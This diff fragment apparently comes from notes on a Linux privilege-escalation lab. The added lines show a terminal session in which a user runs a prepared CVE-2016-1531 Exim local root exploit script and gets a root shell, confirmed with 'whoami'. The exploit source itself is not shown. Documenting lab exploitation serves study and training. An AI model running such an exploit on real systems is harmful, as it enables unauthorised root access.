@@ -708,7 +708,24 @@ user@debian:~$
 
 ```
 
+```
+/home/user/tools/suid/exim/cve-2016-1531.sh
 
+user@debian:~/tools/suid/exim$ ls
+cve-2016-1531.sh
+user@debian:~/tools/suid/exim$ chmod +x cve-2016-1531.sh 
+user@debian:~/tools/suid/exim$ ./cve-2016-1531.sh 
+[ CVE-2016-1531 local root exploit
+sh-4.1# 
+sh-4.1# whoami
+root
+sh-4.1# pwd
+/home/user/tools/suid/exim
+sh-4.1# echo $SHELL
+/bin/bash
+sh-4.1# 
+
+```
 
 
 
